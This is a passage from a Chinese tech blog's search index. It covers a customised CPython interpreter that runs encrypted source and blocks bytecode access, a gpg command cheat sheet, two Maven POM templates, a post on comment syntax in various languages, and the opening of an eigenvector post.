enpasswd.txt 的方式来告知解释器加密密钥的文件路径。其实现如下： [Modules/main.c]--------------------------------------/* 命令行选项，注意k:是新增的内容 */#define BASE_OPTS \"3bBc:dEhiJk:m:OQ:RsStuUvVW:xX?\".../* Long usage message, split into parts &lt; 512 bytes */static char *usage_1 = \"\\...-k key : decrypt source file by using key file\\n\\...\";...intPy_Main(int argc, char **argv){ ... char *keyfilename = NULL; ... while ((c = _PyOS_GetOpt(argc, argv, PROGRAM_OPTS)) != EOF) { ... case 'k': keyfilename = (char *)malloc(strlen(_PyOS_optarg) + 1); if (keyfilename == NULL) Py_FatalError( \"not enough memory to copy -k argument\"); strcpy(keyfilename, _PyOS_optarg); keyfilename[strlen(_PyOS_optarg)] = '\\0'; break; ... } ... if (keyfilename != NULL) { int passwdlen; char *passwd = NULL; passwdlen = rsa_decrypt(keyfilename, &amp;passwd); set_aes_passwd(passwd); if (passwdlen &lt; 0) { fprintf(stderr, \"%s: parsing key file '%s' error\\n\", argv[0], keyfilename); free(keyfilename); return 2; } else { free(keyfilename); } } ...} 其逻辑如下： k: 中的 k 表示支持 -k 选项；: 表示选项后跟一个参数，即这里的已加密密钥文件的路径 解释器在处理到 -k 参数时，获取其后所跟的文件路径，记录在 keyfilename 中 使用自定义的 rsa_decrypt 函数（限于篇幅，不列出如何实现的逻辑）对已加密密钥文件进行非对称解密，获得密钥的原始内容 将该密钥内容写入到 aes_passwd 中 由此，通过显示地指定已加密密钥文件，解释器获得了原始密钥，进而通过该密钥解密已加密代码，再执行原始代码。但是，这里面还潜藏着一个风险：执行代码的过程中会生成 .pyc 文件，通过它反编译出的 .py 文件是未加密的。换句话说，恶意用户可以通过这种手段绕过限制。所以，我们需要禁用字节码 禁用字节码不生成 .pyc 文件首先要做的就是不生成 .pyc 文件，这样，恶意用户就没法直接根据 .pyc 文件来得到源码。 我们知道，通过 -B 选项可以告知 Python 解释器不生成 .pyc 文件。既然定制的 Python 解释器就不生成 .pyc 我们干脆禁用这个选项： [Modules/main.c]--------------------------------------/* 命令行选项，注意移除了B */#define BASE_OPTS \"3bc:dEhiJm:OQ:RsStuUvVW:xX?\".../* Long usage message, split into parts &lt; 512 bytes */static char *usage_1 = \"\\...//-B : don't write .py[co] files on import; also PYTHONDONTWRITEBYTECODE=x\\n\\...\";...intPy_Main(int argc, char **argv){ ... // 不生成 py[co] Py_DontWriteBytecodeFlag++; ...} 除此以外，Python 解释器还会从环境变量中获取是否不生成 .pyc 文件，因此也需要做处理： [Python/pythonrun.c]--------------------------------------voidPy_InitializeEx(int install_sigs){ ... f ((p = Py_GETENV(\"PYTHONDEBUG\")) &amp;&amp; *p != '\\0') Py_DebugFlag = add_flag(Py_DebugFlag, p); if ((p = Py_GETENV(\"PYTHONVERBOSE\")) &amp;&amp; *p != '\\0') Py_VerboseFlag = add_flag(Py_VerboseFlag, p); if ((p = Py_GETENV(\"PYTHONOPTIMIZE\")) &amp;&amp; *p != '\\0') Py_OptimizeFlag = add_flag(Py_OptimizeFlag, p); // 移除对 PYTHONDONTWRITEBYTECODE 的处理 if ((p = Py_GETENV(\"PYTHONDONTWRITEBYTECODE\")) &amp;&amp; *p != '\\0') Py_DontWriteBytecodeFlag = add_flag(Py_DontWriteBytecodeFlag, p); ...} 禁止访问字节码对象 co_code仅仅是不生成 .pyc 文件还是不够的，恶意用户已然可以访问对象的 co_code 属性来获取字节码，进而通过反编译的手段获取到源码。因此，我们也需要禁止用户访问字节码对象： [Objects/codeobject.c]--------------------------------------static PyMemberDef code_memberlist[] = { {\"co_argcount\", T_INT, OFF(co_argcount), READONLY}, {\"co_nlocals\", T_INT, OFF(co_nlocals), READONLY}, {\"co_stacksize\",T_INT, OFF(co_stacksize), READONLY}, {\"co_flags\", T_INT, OFF(co_flags), READONLY}, // {\"co_code\", T_OBJECT, OFF(co_code), READONLY}, {\"co_consts\", T_OBJECT, OFF(co_consts), READONLY}, {\"co_names\", T_OBJECT, OFF(co_names), READONLY}, {\"co_varnames\", T_OBJECT, OFF(co_varnames), READONLY}, {\"co_freevars\", T_OBJECT, OFF(co_freevars), READONLY}, {\"co_cellvars\", T_OBJECT, OFF(co_cellvars), READONLY}, {\"co_filename\", T_OBJECT, OFF(co_filename), READONLY}, {\"co_name\", T_OBJECT, OFF(co_name), READONLY}, {\"co_firstlineno\", T_INT, OFF(co_firstlineno), READONLY}, {\"co_lnotab\", T_OBJECT, OFF(co_lnotab), READONLY}, {NULL} /* Sentinel */}; 到此，一个定制的 Python 解释器完成了。 演示运行脚本通过 -k 选项执行已加密密钥文件，Python 解释器可以运行已加密和未加密的 Python 文件。 加载模块可以通过 -m 的方式加载已加密和未加密的模块，也可以通过 import 的方式来加载已加密和未加密的模块。 禁用字节码通过禁用字节码，我们达到以下效果： 不会生成 .pyc 文件 可以访问函数的 func_code 无法访问代码对象的 co_code，即本示例中的 f.func_code.co_code 无法使用 dis 模块来获取字节码 异常堆栈信息尽管代码是加密的，但是不会影响异常时的堆栈信息。 调试加密的代码也是允许调试的，但是输出的代码内容会是加密的，这正是我们所期望的。 思考 1. 如何防止通过内存操作的方式找到对象的 co_code? 2. 如何进一步提升私钥被逆向工程探知的难度？ 3. 如何能在调试并希望看到源码的时候看到? 参考文献5 种方法，加密你的 Python 代码 如何加密你的 Python 代码 附录: gpg 命令行# 生成 gpg 密钥gpg --gen-key# 生成吊销证书gpg --gen-revoke 735C4581G2442686# 列出所有 gpg 公钥gpg --list-keys# 列出所有 gpg 私钥gpg --list-secret-keys# 删除 gpg 公钥gpg --delete-keys 735C4581G2442686# 删除 gpg 私钥gpg --delete-secret-keys 735C4581G2442686# 输出 gpg 公钥 asciigpg --armor --output public.key --export 735C4581G2442686# 输出 gpg 私钥 asciigpg --armor --output private.key --export-secret-keys 735C4581G2442686# 上传 gpg 公钥gpg --send-keys 735C4581G2442686 --keyserver # 查看 gpg 公钥指纹gpg --fingerprint 735C4581G2442686# 导入 gpg 密钥(导入私钥时会自动导入公钥)gpg --import private.key# 加密文件gpg --recipient 735C4581G2442686 --output encrypt.file --encrypt origin.file# 解密文件gpg --output origin.file --decrypt encrypt.file# 文件签名，生成二进制的 gpg 文件gpg --sign file.txt# 文件签名，生成文本末尾追加 ASCII 签名的 asc 文件gpg --clearsign file.txt# 文件签名，生成二进制的 sig 文件gpg --detach-sign file.txt# 文件签名，生成 ASCII 格式的 asc 文件gpg --detach-sign file.txt# 签名并加密gpg --local-user 735C4581G2442686 --recipient 735C4581G2442686 --armor --sign --encrypt file.txt# 验证签名gpg --verify file.txt.asc file.txt# 延期# gpg 也是使用主密钥和子密钥结合加密的# pub 和 sub 分别是主公钥和子公钥# sec 和 ssb 分别是主私钥和子私钥# 如果有多个子密钥，会显示更多的 sub 和 ssb# 一个主密钥可以绑定多个子密钥，平时加密解密使用的都是子密钥gpg --edit-key admin@XXXXXXXX.comsec rsa4096/6E22BF79E2586289 创建于：2019-02-11 有效至：9012-12-08 可用于：SC 信任度：未知 有效性：未知ssb rsa4096/A1FB112628F3B06C 创建于：2019-02-11 有效至：9012-12-08 可用于：E[ 未知 ] (1). Wildlife &lt;admin@XXXXXXXX.com&gt;# 指定子密钥，不指定则为主密钥gpg&gt; key 1sec rsa4096/6E22BF79E2586289 创建于：2019-02-11 有效至：9012-12-08 可用于：SC 信任度：未知 有效性：未知ssb* rsa4096/A1FB112628F3B06C 创建于：2019-02-11 有效至：9012-12-08 可用于：E[ 未知 ] (1). Wildlife &lt;admin@XXXXXXXX.com&gt;# 更新过期时间gpg&gt; expire将要变更子密钥的过期时间。请设定这个密钥的有效期限。 0 = 密钥永不过期 &lt;n&gt; = 密钥在 n 天后过期 &lt;n&gt;w = 密钥在 n 周后过期 &lt;n&gt;m = 密钥在 n 月后过期 &lt;n&gt;y = 密钥在 n 年后过期密钥的有效期限是？(0) 2y密钥于 9014年12月08日 星期二 12时53分35秒 CST 过期这些内容正确吗？ (y/N) ysec rsa4096/6E22BF79E2586289 创建于：2019-02-11 有效至：9012-12-08 可用于：SC 信任度：未知 有效性：未知ssb* rsa4096/A1FB112628F3B06C 创建于：2019-02-11 有效至：2022-01-25 可用于：E[ 未知 ] (1). Wildlife &lt;admin@XXXXXXXX.com&gt;gpg&gt; save","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.mhuig.top/categories/Python/"},{"name":"解释器","slug":"Python/解释器","permalink":"https://blog.mhuig.top/categories/Python/%E8%A7%A3%E9%87%8A%E5%99%A8/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://blog.mhuig.top/tags/Python/"},{"name":"解释器","slug":"解释器","permalink":"https://blog.mhuig.top/tags/%E8%A7%A3%E9%87%8A%E5%99%A8/"},{"name":"源码保护","slug":"源码保护","permalink":"https://blog.mhuig.top/tags/%E6%BA%90%E7%A0%81%E4%BF%9D%E6%8A%A4/"},{"name":"加解密","slug":"加解密","permalink":"https://blog.mhuig.top/tags/%E5%8A%A0%E8%A7%A3%E5%AF%86/"}]},{"title":"WebSocket Maven 配置模板","slug":"code/WebSocketmaven配置模板","date":"2020-01-12T05:59:18.000Z","updated":"2020-01-12T05:59:18.000Z","comments":true,"path":"p/4a71123b/","permalink":"https://blog.mhuig.top/p/4a71123b/","excerpt":"maven 配置模板","text":"maven 配置模板 WebSocketTemplate源码 GitHub &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;cn&lt;/groupId&gt; &lt;artifactId&gt;WebSocketTest&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;packaging&gt;war&lt;/packaging&gt; &lt;repositories&gt; &lt;repository&gt; &lt;id&gt;cloudera&lt;/id&gt; &lt;url&gt;https://repository.cloudera.com/artifactory/cloudera-repos/&lt;/url&gt; &lt;/repository&gt; &lt;/repositories&gt; &lt;dependencies&gt; &lt;!-- WebSocket --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-websocket&lt;/artifactId&gt; &lt;version&gt;4.2.4.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-messaging&lt;/artifactId&gt; &lt;version&gt;4.2.4.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Spring --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-context&lt;/artifactId&gt; &lt;version&gt;4.2.4.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-beans&lt;/artifactId&gt; &lt;version&gt;4.2.4.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;4.2.4.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-jdbc&lt;/artifactId&gt; &lt;version&gt;4.2.4.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-aspects&lt;/artifactId&gt; &lt;version&gt;4.2.4.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-jms&lt;/artifactId&gt; &lt;version&gt;4.2.4.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-context-support&lt;/artifactId&gt; &lt;version&gt;4.2.4.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Mybatis --&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;3.2.8&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring&lt;/artifactId&gt; &lt;version&gt;1.2.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.miemiedev&lt;/groupId&gt; &lt;artifactId&gt;mybatis-paginator&lt;/artifactId&gt; &lt;version&gt;1.2.15&lt;/version&gt; &lt;/dependency&gt; &lt;!-- MySql --&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.32&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 连接池 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid&lt;/artifactId&gt; &lt;version&gt;1.0.9&lt;/version&gt; &lt;/dependency&gt; &lt;!-- JSP相关 --&gt; &lt;dependency&gt; &lt;groupId&gt;jstl&lt;/groupId&gt; &lt;artifactId&gt;jstl&lt;/artifactId&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;servlet-api&lt;/artifactId&gt; &lt;version&gt;2.5&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;jsp-api&lt;/artifactId&gt; &lt;version&gt;2.0&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.9.10.1&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.41&lt;/version&gt; &lt;/dependency&gt; &lt;!-- junit--&gt; &lt;!-- https://mvnrepository.com/artifact/junit/junit --&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.11&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.testng&lt;/groupId&gt; &lt;artifactId&gt;testng&lt;/artifactId&gt; &lt;version&gt;RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-shade-plugin&lt;/artifactId&gt; &lt;version&gt;2.4.3&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;shade&lt;/goal&gt; &lt;/goals&gt; &lt;configuration&gt; &lt;minimizeJar&gt;true&lt;/minimizeJar&gt; &lt;/configuration&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;!-- 配置Tomcat插件 --&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.tomcat.maven&lt;/groupId&gt; &lt;artifactId&gt;tomcat7-maven-plugin&lt;/artifactId&gt; &lt;version&gt;2.2&lt;/version&gt; &lt;configuration&gt; &lt;path&gt;/&lt;/path&gt; &lt;port&gt;8080&lt;/port&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;finalName&gt;${project.artifactId}&lt;/finalName&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/java&lt;/directory&gt; &lt;includes&gt; &lt;include&gt;**/*.properties&lt;/include&gt; &lt;include&gt;**/*.xml&lt;/include&gt; &lt;/includes&gt; &lt;filtering&gt;false&lt;/filtering&gt; &lt;/resource&gt; &lt;resource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;includes&gt; &lt;include&gt;**/*.properties&lt;/include&gt; &lt;include&gt;**/*.xml&lt;/include&gt; &lt;/includes&gt; &lt;filtering&gt;false&lt;/filtering&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;/build&gt;&lt;/project&gt;","categories":[{"name":"模板","slug":"模板","permalink":"https://blog.mhuig.top/categories/%E6%A8%A1%E6%9D%BF/"},{"name":"maven","slug":"模板/maven","permalink":"https://blog.mhuig.top/categories/%E6%A8%A1%E6%9D%BF/maven/"}],"tags":[{"name":"maven","slug":"maven","permalink":"https://blog.mhuig.top/tags/maven/"},{"name":"模板","slug":"模板","permalink":"https://blog.mhuig.top/tags/%E6%A8%A1%E6%9D%BF/"},{"name":"WebSocket","slug":"WebSocket","permalink":"https://blog.mhuig.top/tags/WebSocket/"}]},{"title":"SSM Maven 配置模板","slug":"code/SSM maven配置模板","date":"2020-01-12T05:59:17.000Z","updated":"2020-01-12T05:59:17.000Z","comments":true,"path":"p/4a71133b/","permalink":"https://blog.mhuig.top/p/4a71133b/","excerpt":"maven 配置模板","text":"maven 配置模板 SSMTemplate源码 GitHub &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;cn&lt;/groupId&gt; &lt;artifactId&gt;WebSocketTest&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;packaging&gt;war&lt;/packaging&gt; &lt;repositories&gt; &lt;repository&gt; &lt;id&gt;cloudera&lt;/id&gt; &lt;url&gt;https://repository.cloudera.com/artifactory/cloudera-repos/&lt;/url&gt; &lt;/repository&gt; &lt;/repositories&gt; &lt;dependencies&gt; &lt;!-- Spring --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-context&lt;/artifactId&gt; &lt;version&gt;4.2.4.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-beans&lt;/artifactId&gt; &lt;version&gt;4.2.4.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;4.2.4.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-jdbc&lt;/artifactId&gt; &lt;version&gt;4.2.4.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-aspects&lt;/artifactId&gt; &lt;version&gt;4.2.4.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-jms&lt;/artifactId&gt; &lt;version&gt;4.2.4.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-context-support&lt;/artifactId&gt; &lt;version&gt;4.2.4.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Mybatis --&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;3.2.8&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring&lt;/artifactId&gt; &lt;version&gt;1.2.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.miemiedev&lt;/groupId&gt; &lt;artifactId&gt;mybatis-paginator&lt;/artifactId&gt; &lt;version&gt;1.2.15&lt;/version&gt; &lt;/dependency&gt; &lt;!-- MySql --&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.32&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 连接池 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid&lt;/artifactId&gt; &lt;version&gt;1.0.9&lt;/version&gt; &lt;/dependency&gt; &lt;!-- JSP相关 --&gt; &lt;dependency&gt; &lt;groupId&gt;jstl&lt;/groupId&gt; &lt;artifactId&gt;jstl&lt;/artifactId&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;servlet-api&lt;/artifactId&gt; &lt;version&gt;2.5&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;jsp-api&lt;/artifactId&gt; &lt;version&gt;2.0&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.9.10.1&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.41&lt;/version&gt; &lt;/dependency&gt; &lt;!-- junit--&gt; &lt;!-- https://mvnrepository.com/artifact/junit/junit --&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.11&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.testng&lt;/groupId&gt; &lt;artifactId&gt;testng&lt;/artifactId&gt; &lt;version&gt;RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-shade-plugin&lt;/artifactId&gt; &lt;version&gt;2.4.3&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;shade&lt;/goal&gt; &lt;/goals&gt; &lt;configuration&gt; &lt;minimizeJar&gt;true&lt;/minimizeJar&gt; &lt;/configuration&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;!-- 配置Tomcat插件 --&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.tomcat.maven&lt;/groupId&gt; &lt;artifactId&gt;tomcat7-maven-plugin&lt;/artifactId&gt; &lt;version&gt;2.2&lt;/version&gt; &lt;configuration&gt; &lt;path&gt;/&lt;/path&gt; &lt;port&gt;8080&lt;/port&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;finalName&gt;${project.artifactId}&lt;/finalName&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/java&lt;/directory&gt; &lt;includes&gt; &lt;include&gt;**/*.properties&lt;/include&gt; &lt;include&gt;**/*.xml&lt;/include&gt; &lt;/includes&gt; &lt;filtering&gt;false&lt;/filtering&gt; &lt;/resource&gt; &lt;resource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;includes&gt; &lt;include&gt;**/*.properties&lt;/include&gt; &lt;include&gt;**/*.xml&lt;/include&gt; &lt;/includes&gt; &lt;filtering&gt;false&lt;/filtering&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;/build&gt;&lt;/project&gt;","categories":[{"name":"模板","slug":"模板","permalink":"https://blog.mhuig.top/categories/%E6%A8%A1%E6%9D%BF/"},{"name":"maven","slug":"模板/maven","permalink":"https://blog.mhuig.top/categories/%E6%A8%A1%E6%9D%BF/maven/"}],"tags":[{"name":"maven","slug":"maven","permalink":"https://blog.mhuig.top/tags/maven/"},{"name":"模板","slug":"模板","permalink":"https://blog.mhuig.top/tags/%E6%A8%A1%E6%9D%BF/"},{"name":"SSM","slug":"SSM","permalink":"https://blog.mhuig.top/tags/SSM/"}]},{"title":"","slug":"notes/Flink","date":"2020-01-08T23:56:00.000Z","updated":"2022-05-12T23:56:00.000Z","comments":false,"path":"p/notes-flink/","permalink":"https://blog.mhuig.top/p/notes-flink/","excerpt":"","text":".fa-secondary{opacity:.4} Flink Flink 开始阅读","categories":[{"name":"大数据","slug":"大数据","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"Flink","slug":"大数据/Flink","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/Flink/"}],"tags":[{"name":"Flink","slug":"Flink","permalink":"https://blog.mhuig.top/tags/Flink/"}]},{"title":"删除注释自动化","slug":"code/删除注释自动化","date":"2019-12-29T03:14:41.000Z","updated":"2019-12-29T03:14:41.000Z","comments":true,"path":"p/53d0a404/","permalink":"https://blog.mhuig.top/p/53d0a404/","excerpt":"实现批量删除 python java C CPP JS CSS html xml php sql 注释","text":"实现批量删除 python java C CPP JS CSS html xml php sql 注释 源码见 GitHub PythonPython 中的注释有单行注释和多行注释： 井号（#） Python 中单行注释以 # 开头，例如： # 这是一个注释print(\"Hello, World!\")多行注释用三个单引号 ''' 或者三个双引号 \"\"\" 将注释括起来，例如: 单引号（'''） #!/usr/bin/python3 '''这是多行注释，用三个单引号这是多行注释，用三个单引号 这是多行注释，用三个单引号'''print(\"Hello, World!\") 双引号（\"\"\"） #!/usr/bin/python3 \"\"\"这是多行注释，用三个双引号这是多行注释，用三个双引号 这是多行注释，用三个双引号\"\"\"print(\"Hello, World!\") java 单行注释 // 注释内容 多行注释 /*... 注释内容....... 注释内容....... 注释内容....*/ 文档注释 import java.io.*; /*** 这个类演示了文档注释* @author Ayan Amhed* @version 1.2*/public class SquareNum { /** * This method returns the square of num. * This is a multiline description. You can use * as many lines as you like. * @param num The value to be squared. * @return num squared. */ public double square(double num) { return num * num; } /** * This method inputs a number from the user. * @return The value input as a double. * @exception IOException On input error. * @see IOException */ public double getNumber() throws IOException { InputStreamReader isr = new InputStreamReader(System.in); BufferedReader inData = new BufferedReader(isr); String str; str = inData.readLine(); return (new Double(str)).doubleValue(); } /** * This method demonstrates square(). * @param args Unused. * @return Nothing. * @exception IOException On input error. * @see IOException */ public static void main(String args[]) throws IOException { SquareNum ob = new SquareNum(); double val; System.out.println(\"Enter value to be squared: \"); val = ob.getNumber(); val = ob.square(val); System.out.println(\"Squared value is \" + val); }} C 语言 以//开始、以换行符结束的单行注释 const double pi = 3.1415926536; // pi是—个常量 以/开始、以/结束的块注释 int open( const char *name, int mode, … /* int permissions */ ); html 标签 &lt;!--这是一段注释。--&gt;&lt;p&gt;这是一段普通的段落。&lt;/p&gt; php // 单行注释 // 单行注释 井号（#） 单行注释 # 单行注释 /* */多行注释块 /*这是多行注释块它横跨了多行*/","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.mhuig.top/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://blog.mhuig.top/tags/Python/"},{"name":"删除注释","slug":"删除注释","permalink":"https://blog.mhuig.top/tags/%E5%88%A0%E9%99%A4%E6%B3%A8%E9%87%8A/"}]},{"title":"","slug":"notes/Windows","date":"2019-12-22T23:56:00.000Z","updated":"2022-05-12T23:56:00.000Z","comments":false,"path":"p/notes-windows/","permalink":"https://blog.mhuig.top/p/notes-windows/","excerpt":"","text":"Windows Windows 开始阅读","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://blog.mhuig.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"Windows","slug":"操作系统/Windows","permalink":"https://blog.mhuig.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://blog.mhuig.top/tags/Windows/"}]},{"title":"特征向量和特征值的几何本质","slug":"ml/特征向量和特征值的几何本质","date":"2019-11-17T01:52:45.000Z","updated":"2019-11-17T01:52:45.000Z","comments":true,"path":"p/f0765214/","permalink":"https://blog.mhuig.top/p/f0765214/","excerpt":"子矩阵的特征值编码了原矩阵特征向量的隐藏信息。","text":"子矩阵的特征值编码了原矩阵特征向量的隐藏信息。 为阶矩阵，若数和维非列向量满足 ，那么数称为的特征值，称为的对应于特征值的特征向量。 它的物理意义是： 